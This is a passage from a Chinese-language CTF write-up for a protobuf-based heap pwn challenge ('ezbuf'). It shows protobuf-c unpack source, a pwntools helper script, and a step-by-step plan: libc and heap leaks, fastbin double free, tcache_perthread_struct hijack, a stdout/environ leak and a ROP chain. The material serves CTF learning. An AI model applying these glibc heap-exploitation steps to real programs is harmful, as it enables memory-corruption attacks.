class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><code class="hljs c">ProtobufCMessage *<br><span class="hljs-title function_">protobuf_c_message_unpack</span><span class="hljs-params">(<span class="hljs-type">const</span> ProtobufCMessageDescriptor *desc,</span><br><span class="hljs-params">			  ProtobufCAllocator *allocator,</span><br><span class="hljs-params">			  <span class="hljs-type">size_t</span> len, <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data)</span><br>&#123;<br>	ProtobufCMessage *rv;<br>	<span class="hljs-type">size_t</span> rem = len;<br>	<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *at = data;<br>	<span class="hljs-type">const</span> ProtobufCFieldDescriptor *last_field = desc-&gt;fields + <span class="hljs-number">0</span>;<br>	ScannedMember first_member_slab[<span class="hljs-number">1UL</span> &lt;&lt;<br>					FIRST_SCANNED_MEMBER_SLAB_SIZE_LOG2];<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * scanned_member_slabs[i] is an array of arrays of ScannedMember.</span><br><span class="hljs-comment">	 * The first slab (scanned_member_slabs[0] is just a pointer to</span><br><span class="hljs-comment">	 * first_member_slab), above. All subsequent slabs will be allocated</span><br><span class="hljs-comment">	 * using the allocator.</span><br><span class="hljs-comment">	 */</span><br>	ScannedMember *scanned_member_slabs[MAX_SCANNED_MEMBER_SLAB + <span class="hljs-number">1</span>];<br>	<span class="hljs-type">unsigned</span> which_slab = <span class="hljs-number">0</span>; <span class="hljs-comment">/* the slab we are currently populating */</span><br>	<span class="hljs-type">unsigned</span> in_slab_index = <span class="hljs-number">0</span>; <span class="hljs-comment">/* number of members in the slab */</span><br>	<span class="hljs-type">size_t</span> n_unknown = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> f;<br>	<span class="hljs-type">unsigned</span> j;<br>	<span class="hljs-type">unsigned</span> i_slab;<br>	<span class="hljs-type">unsigned</span> last_field_index = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> required_fields_bitmap_len;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> required_fields_bitmap_stack[<span class="hljs-number">16</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *required_fields_bitmap = required_fields_bitmap_stack;<br>	protobuf_c_boolean required_fields_bitmap_alloced = FALSE;<br><br>	ASSERT_IS_MESSAGE_DESCRIPTOR(desc);<br><br>	<span class="hljs-keyword">if</span> (allocator == <span class="hljs-literal">NULL</span>)<br>		allocator = &amp;protobuf_c__allocator;<br><br>	rv = do_alloc(allocator, desc-&gt;sizeof_message);<br>	<span class="hljs-keyword">if</span> (!rv)<br>		<span class="hljs-keyword">return</span> (<span class="hljs-literal">NULL</span>);<br>	scanned_member_slabs[<span class="hljs-number">0</span>] = first_member_slab;<br><br>	required_fields_bitmap_len = (desc-&gt;n_fields + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br>	<span class="hljs-keyword">if</span> (required_fields_bitmap_len &gt; <span class="hljs-keyword">sizeof</span>(required_fields_bitmap_stack)) &#123;<br>		required_fields_bitmap = do_alloc(allocator, required_fields_bitmap_len);<br>		<span class="hljs-keyword">if</span> (!required_fields_bitmap) &#123;<br>			do_free(allocator, rv);<br>			<span class="hljs-keyword">return</span> (<span class="hljs-literal">NULL</span>);<br>		&#125;<br>		required_fields_bitmap_alloced = TRUE;<br>	&#125;<br>	<span class="hljs-built_in">memset</span>(required_fields_bitmap, <span class="hljs-number">0</span>, required_fields_bitmap_len);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Generated code always defines &quot;message_init&quot;. However, we provide a</span><br><span class="hljs-comment">	 * fallback for (1) users of old protobuf-c generated-code that do not</span><br><span class="hljs-comment">	 * provide the function, and (2) descriptors constructed from some other</span><br><span class="hljs-comment">	 * source (most likely, direct construction from the .proto file).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (desc-&gt;message_init != <span class="hljs-literal">NULL</span>)<br>		protobuf_c_message_init(desc, rv);<br>	<span class="hljs-keyword">else</span><br>		message_init_generic(desc, rv);<br><br>	<span class="hljs-keyword">while</span> (rem &gt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-type">uint32_t</span> tag;<br>		<span class="hljs-type">uint8_t</span> wire_type;<br>		<span class="hljs-type">size_t</span> used = parse_tag_and_wiretype(rem, at, &amp;tag, &amp;wire_type);<br>		<span class="hljs-type">const</span> ProtobufCFieldDescriptor *field;<br>		ScannedMember tmp;<br><br>		<span class="hljs-keyword">if</span> (used == <span class="hljs-number">0</span>) &#123;<br>			PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;error parsing tag/wiretype at offset %u&quot;</span>,<br>						(<span class="hljs-type">unsigned</span>) (at - data));<br>			<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>		&#125;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * \todo Consider optimizing for field[1].id == tag, if field[1]</span><br><span class="hljs-comment">		 * exists!</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (last_field == <span class="hljs-literal">NULL</span> || last_field-&gt;id != tag) &#123;<br>			<span class="hljs-comment">/* lookup field */</span><br>			<span class="hljs-type">int</span> field_index =<br>			    int_range_lookup(desc-&gt;n_field_ranges,<br>					     desc-&gt;field_ranges,<br>					     tag);<br>			<span class="hljs-keyword">if</span> (field_index &lt; <span class="hljs-number">0</span>) &#123;<br>				field = <span class="hljs-literal">NULL</span>;<br>				n_unknown++;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				field = desc-&gt;fields + field_index;<br>				last_field = field;<br>				last_field_index = field_index;<br>			&#125;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			field = last_field;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (field != <span class="hljs-literal">NULL</span> &amp;&amp; field-&gt;label == PROTOBUF_C_LABEL_REQUIRED)<br>			REQUIRED_FIELD_BITMAP_SET(last_field_index);<br><br>		at += used;<br>		rem -= used;<br>		tmp.tag = tag;<br>		tmp.wire_type = wire_type;<br>		tmp.field = field;<br>		tmp.data = at;<br>		tmp.length_prefix_len = <span class="hljs-number">0</span>;<br><br>		<span class="hljs-keyword">switch</span> (wire_type) &#123;<br>		<span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_VARINT: &#123;<br>			<span class="hljs-type">unsigned</span> max_len = rem &lt; <span class="hljs-number">10</span> ? rem : <span class="hljs-number">10</span>;<br>			<span class="hljs-type">unsigned</span> i;<br><br>			<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; max_len; i++)<br>				<span class="hljs-keyword">if</span> ((at[i] &amp; <span class="hljs-number">0x80</span>) == <span class="hljs-number">0</span>)<br>					<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">if</span> (i == max_len) &#123;<br>				PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;unterminated varint at offset %u&quot;</span>,<br>							(<span class="hljs-type">unsigned</span>) (at - data));<br>				<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>			&#125;<br>			tmp.len = i + <span class="hljs-number">1</span>;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_64BIT:<br>			<span class="hljs-keyword">if</span> (rem &lt; <span class="hljs-number">8</span>) &#123;<br>				PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;too short after 64bit wiretype at offset %u&quot;</span>,<br>							(<span class="hljs-type">unsigned</span>) (at - data));<br>				<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>			&#125;<br>			tmp.len = <span class="hljs-number">8</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_LENGTH_PREFIXED: &#123;<br>			<span class="hljs-type">size_t</span> pref_len;<br><br>			tmp.len = scan_length_prefixed_data(rem, at, &amp;pref_len);<br>			<span class="hljs-keyword">if</span> (tmp.len == <span class="hljs-number">0</span>) &#123;<br>				<span class="hljs-comment">/* <span class="hljs-doctag">NOTE:</span> scan_length_prefixed_data calls UNPACK_ERROR */</span><br>				<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>			&#125;<br>			tmp.length_prefix_len = pref_len;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-keyword">case</span> PROTOBUF_C_WIRE_TYPE_32BIT:<br>			<span class="hljs-keyword">if</span> (rem &lt; <span class="hljs-number">4</span>) &#123;<br>				PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;too short after 32bit wiretype at offset %u&quot;</span>,<br>					      (<span class="hljs-type">unsigned</span>) (at - data));<br>				<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>			&#125;<br>			tmp.len = <span class="hljs-number">4</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">default</span>:<br>			PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;unsupported tag %u at offset %u&quot;</span>,<br>						wire_type, (<span class="hljs-type">unsigned</span>) (at - data));<br>			<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (in_slab_index == (<span class="hljs-number">1UL</span> &lt;&lt;<br>			(which_slab + FIRST_SCANNED_MEMBER_SLAB_SIZE_LOG2)))<br>		&#123;<br>			<span class="hljs-type">size_t</span> size;<br><br>			in_slab_index = <span class="hljs-number">0</span>;<br>			<span class="hljs-keyword">if</span> (which_slab == MAX_SCANNED_MEMBER_SLAB) &#123;<br>				PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;too many fields&quot;</span>);<br>				<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>			&#125;<br>			which_slab++;<br>			size = <span class="hljs-keyword">sizeof</span>(ScannedMember)<br>				&lt;&lt; (which_slab + FIRST_SCANNED_MEMBER_SLAB_SIZE_LOG2);<br>			scanned_member_slabs[which_slab] = do_alloc(allocator, size);<br>			<span class="hljs-keyword">if</span> (scanned_member_slabs[which_slab] == <span class="hljs-literal">NULL</span>)<br>				<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>		&#125;<br>		scanned_member_slabs[which_slab][in_slab_index++] = tmp;<br><br>		<span class="hljs-keyword">if</span> (field != <span class="hljs-literal">NULL</span> &amp;&amp; field-&gt;label == PROTOBUF_C_LABEL_REPEATED) &#123;<br>			<span class="hljs-type">size_t</span> *n = STRUCT_MEMBER_PTR(<span class="hljs-type">size_t</span>, rv,<br>						      field-&gt;quantifier_offset);<br>			<span class="hljs-keyword">if</span> (wire_type == PROTOBUF_C_WIRE_TYPE_LENGTH_PREFIXED &amp;&amp;<br>			    (<span class="hljs-number">0</span> != (field-&gt;flags &amp; PROTOBUF_C_FIELD_FLAG_PACKED) ||<br>			     is_packable_type(field-&gt;type)))<br>			&#123;<br>				<span class="hljs-type">size_t</span> count;<br>				<span class="hljs-keyword">if</span> (!count_packed_elements(field-&gt;type,<br>							   tmp.len -<br>							   tmp.length_prefix_len,<br>							   tmp.data +<br>							   tmp.length_prefix_len,<br>							   &amp;count))<br>				&#123;<br>					PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;counting packed elements&quot;</span>);<br>					<span class="hljs-keyword">goto</span> error_cleanup_during_scan;<br>				&#125;<br>				*n += count;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				*n += <span class="hljs-number">1</span>;<br>			&#125;<br>		&#125;<br><br>		at += tmp.len;<br>		rem -= tmp.len;<br>	&#125;<br><br>	<span class="hljs-comment">/* allocate space for repeated fields, also check that all required fields have been set */</span><br>	<span class="hljs-keyword">for</span> (f = <span class="hljs-number">0</span>; f &lt; desc-&gt;n_fields; f++) &#123;<br>		<span class="hljs-type">const</span> ProtobufCFieldDescriptor *field = desc-&gt;fields + f;<br>		<span class="hljs-keyword">if</span> (field == <span class="hljs-literal">NULL</span>) &#123;<br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (field-&gt;label == PROTOBUF_C_LABEL_REPEATED) &#123;<br>			<span class="hljs-type">size_t</span> siz =<br>			    sizeof_elt_in_repeated_array(field-&gt;type);<br>			<span class="hljs-type">size_t</span> *n_ptr =<br>			    STRUCT_MEMBER_PTR(<span class="hljs-type">size_t</span>, rv,<br>					      field-&gt;quantifier_offset);<br>			<span class="hljs-keyword">if</span> (*n_ptr != <span class="hljs-number">0</span>) &#123;<br>				<span class="hljs-type">unsigned</span> n = *n_ptr;<br>				<span class="hljs-type">void</span> *a;<br>				*n_ptr = <span class="hljs-number">0</span>;<br>				assert(rv-&gt;descriptor != <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLEAR_REMAINING_N_PTRS()                                              \</span><br><span class="hljs-meta">              for(f++;f <span class="hljs-string">&lt; desc-&gt;</span>n_fields; f++)                                \</span><br><span class="hljs-meta">                &#123;                                                             \</span><br><span class="hljs-meta">                  field = desc-&gt;fields + f;                                   \</span><br><span class="hljs-meta">                  <span class="hljs-keyword">if</span> (field-&gt;label == PROTOBUF_C_LABEL_REPEATED)              \</span><br><span class="hljs-meta">                    STRUCT_MEMBER (size_t, rv, field-&gt;quantifier_offset) = 0; \</span><br><span class="hljs-meta">                &#125;</span><br>				a = do_alloc(allocator, siz * n);<br>				<span class="hljs-keyword">if</span> (!a) &#123;<br>					CLEAR_REMAINING_N_PTRS();<br>					<span class="hljs-keyword">goto</span> error_cleanup;<br>				&#125;<br>				STRUCT_MEMBER(<span class="hljs-type">void</span> *, rv, field-&gt;offset) = a;<br>			&#125;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (field-&gt;label == PROTOBUF_C_LABEL_REQUIRED) &#123;<br>			<span class="hljs-keyword">if</span> (field-&gt;default_value == <span class="hljs-literal">NULL</span> &amp;&amp;<br>			    !REQUIRED_FIELD_BITMAP_IS_SET(f))<br>			&#123;<br>				CLEAR_REMAINING_N_PTRS();<br>				PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;message &#x27;%s&#x27;: missing required field &#x27;%s&#x27;&quot;</span>,<br>							desc-&gt;name, field-&gt;name);<br>				<span class="hljs-keyword">goto</span> error_cleanup;<br>			&#125;<br>		&#125;<br>	&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> CLEAR_REMAINING_N_PTRS</span><br><br>	<span class="hljs-comment">/* allocate space for unknown fields */</span><br>	<span class="hljs-keyword">if</span> (n_unknown) &#123;<br>		rv-&gt;unknown_fields = do_alloc(allocator,<br>					      n_unknown * <span class="hljs-keyword">sizeof</span>(ProtobufCMessageUnknownField));<br>		<span class="hljs-keyword">if</span> (rv-&gt;unknown_fields == <span class="hljs-literal">NULL</span>)<br>			<span class="hljs-keyword">goto</span> error_cleanup;<br>	&#125;<br><br>	<span class="hljs-comment">/* do real parsing */</span><br>	<span class="hljs-keyword">for</span> (i_slab = <span class="hljs-number">0</span>; i_slab &lt;= which_slab; i_slab++) &#123;<br>		<span class="hljs-type">unsigned</span> max = (i_slab == which_slab) ?<br>			in_slab_index : (<span class="hljs-number">1UL</span> &lt;&lt; (i_slab + <span class="hljs-number">4</span>));<br>		ScannedMember *slab = scanned_member_slabs[i_slab];<br><br>		<span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; max; j++) &#123;<br>			<span class="hljs-keyword">if</span> (!parse_member(slab + j, rv, allocator)) &#123;<br>				PROTOBUF_C_UNPACK_ERROR(<span class="hljs-string">&quot;error parsing member %s of %s&quot;</span>,<br>							slab-&gt;field ? slab-&gt;field-&gt;name : <span class="hljs-string">&quot;*unknown-field*&quot;</span>,<br>					desc-&gt;name);<br>				<span class="hljs-keyword">goto</span> error_cleanup;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-comment">/* cleanup */</span><br>	<span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= which_slab; j++)<br>		do_free(allocator, scanned_member_slabs[j]);<br>	<span class="hljs-keyword">if</span> (required_fields_bitmap_alloced)<br>		do_free(allocator, required_fields_bitmap);<br>	<span class="hljs-keyword">return</span> rv;<br><br>error_cleanup:<br>	protobuf_c_message_free_unpacked(rv, allocator);<br>	<span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= which_slab; j++)<br>		do_free(allocator, scanned_member_slabs[j]);<br>	<span class="hljs-keyword">if</span> (required_fields_bitmap_alloced)<br>		do_free(allocator, required_fields_bitmap);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>error_cleanup_during_scan:<br>	do_free(allocator, rv);<br>	<span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= which_slab; j++)<br>		do_free(allocator, scanned_member_slabs[j]);<br>	<span class="hljs-keyword">if</span> (required_fields_bitmap_alloced)<br>		do_free(allocator, required_fields_bitmap);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>首先编写交互逻辑，主要是将create函数和show函数用python实现出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> heybro_pb2<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">1</span><br>    data.whatcon = content<br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">0</span><br>    data.whatsthis = <span class="hljs-number">0</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">2</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">3</span><br>    data.whatcon = <span class="hljs-string">b&#x27;0&#x27;</span><br>    data.whatidx = idx<br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_nothing</span>(<span class="hljs-params">content</span>):<br>    data = heybro_pb2.heybro()<br>    data.whattodo = <span class="hljs-number">0</span><br>    data.whatcon = content<br>    data.whatidx = <span class="hljs-number">1</span><br>    data.whatsize = <span class="hljs-number">1</span><br>    data.whatsthis = <span class="hljs-number">1</span><br>    data = data.SerializeToString()<br>    p.recvuntil(<span class="hljs-string">b&#x27;WANT?\n&#x27;</span>)<br>    p.send(data)    <br><br>gdb.attach(p)<br>create(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p>编写这样的程序，调试运行。<br>第一张是解包函数运行后的堆块变化<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二张是menu函数运行后的堆块变化<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看不同堆块的数据<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-heap-cmp-hexdump.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终运行结果<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak.png" srcset="/img/loading.gif" lazyload></p>
+<p>从这里可以看出，解包过程中会申请两个chunk<br>第一个chunk的大小由ProtobufCMessageDescriptor的sizeof_message成员决定，本题固定为0x48，申请后chunk大小为0x50，符合分析结果<br>第二个chunk的大小由content的大小决定，我们只输入了8个字节，所以会申请最小的chunk，也就是0x20大小的chunk</p>
+<p>第二张图片显示的堆块变化是menu函数申请的0x30大小的堆块，用来存放content，并将unsortedbin的bk指针一起copy了<br>可以得知输入8字节数据后可以泄露出一个unsortedbin的bk指针，调试获取偏移即可计算libc基址</p>
+<p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到偏移 2206944(0x21ace0)</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
+<li>通过泄露的unsortedbin的bk指针调试获取偏移，计算libc基址</li>
+<li>将堆块释放进入tcache，利用PROTECT_PTR机制获取堆上地址(缺少最后12bit)，调试获取与heap基址的偏移，计算heap基址</li>
+<li>利用create函数，不断创建0x40的堆块，最后释放，填满tcache</li>
+<li>利用double free构造fastbin循环链表</li>
+<li>将所有0x40大小的tcache全部申请出来</li>
+<li>调试获取循环链表中第一个链表的地址与heap_base的差值(为了生成PROTECT_PTR保护后的地址)<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-leak-3.png" srcset="/img/loading.gif" lazyload></li>
+<li>利用PROTECT_PTR公式，填充相应的地址<code>p64((heap_base + 0xf0)^((heap_base + 0x004e40)&gt;&gt;12))</code><br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-alloc.png" srcset="/img/loading.gif" lazyload></li>
+<li>在heap_base + 0xf0处(即0xf8大小的tcache块的entries指针处，详细计算过程见<a href="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/#tcache_perthread_struct">tcache_perthread_struct</a>)，填上heap_base+0x10地址，之后申请0xe0大小的堆块后就会在heap_base+0x10处取堆块，由于tcache指向的是用户内存，所以它实际上申请到了tcache_perthread_struct</li>
+<li>之后便可以更改<code>tcache_perthread_struct</code>了，可以实现tcache的任意分配，分配到<code>stdout</code>更改<code>write_ptr</code>和<code>write_end</code>指针泄露<code>environ</code>，调试<code>environ</code>与栈的偏移计算出栈地址，然后在利用<code>tcache_perthread_struct</code>分配到栈上进行ret2libc</li>
+</ol>
+<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><p>tcache_perthread_struct在glibc-2.30有个改动，改动了结构体中counts成员的数据类型</p>
